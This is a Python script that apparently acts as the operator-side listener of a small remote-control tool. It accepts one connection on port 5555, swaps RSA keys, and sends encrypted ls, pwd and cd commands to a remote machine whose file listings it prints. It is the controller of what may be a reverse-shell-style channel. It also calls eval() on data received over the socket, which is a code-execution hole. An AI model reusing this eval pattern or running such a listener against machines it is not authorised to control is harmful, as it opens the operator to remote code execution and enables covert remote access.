from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import socket

class color:
    BLACK = "\u001b[30m"
    RED = "\u001b[31m"
    GREEN = "\u001b[32m"
    YELLOW = "\u001b[33m"
    BLUE = "\u001b[34m"
    MAGENTA = "\u001b[35m"
    CYAN = "\u001b[36m"
    WHITE = "\u001b[37m"

def connSetup():
    server_socket = socket.socket(socket.AF_INET, 
                                  socket.SOCK_STREAM)   # Create Socket
    server_socket.bind(("0.0.0.0", 5555))   #Bind Socket
    server_socket.listen(1) # Listen for Connections
    print("Server is listening...") #Log Binding

    client_socket , client_address= server_socket.accept()  #Accept Connection
    print('Got connection from',client_address )    # Log Connection

    
    privateKey = rsa.generate_private_key(65537, 4096)  # Generate RSA Private Key
    publicKey = privateKey.public_key() # Generate RSA Public Key
    toSend = publicKey.public_bytes(encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo) # Format RSA Public Key
    client_socket.send(toSend)  # Send RSA Public Key

    
    key_bytes = client_socket.recv(8192)    # Recive Remote Public Key
    remoteKey = serialization.load_pem_public_key(key_bytes)    # Load Remote Public Key

    return client_socket, server_socket, privateKey, remoteKey

def crypt(message: bytes):
    ciphertext = remoteKey.encrypt( # type: ignore
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Encrypt message
    return ciphertext

def decrypt(message: bytes):
    mensaje_descifrado = privateKey.decrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))  # Decrypt message
    return mensaje_descifrado.decode()

client_socket, server_socket, privateKey, remoteKey = connSetup()   # Start Connection

# Main Code
while True:
    path = client_socket.recv(8192)
    path = decrypt(path)
    data = input(f"{color.BLUE}{path} >{color.WHITE} ")
    data = data.split(" ")
    command = data[0]

    if command == "ls":
        client_socket.send(crypt("ls".encode())) 
        response = client_socket.recv(8192)
        response = decrypt(response)
        response = eval(response)
        for i in range(0, len(response)): print(response[i])

    elif command == "pwd":
        client_socket.send(crypt("pwd".encode()))
        response = client_socket.recv(8192)
        response = decrypt(response)
        print(response)

    elif command == "cd":
        client_socket.send(crypt(str(data).encode()))

    elif command == "exit":
        print("Cleaning....")
        client_socket.send(crypt("sleep".encode()))
        break


server_socket.close()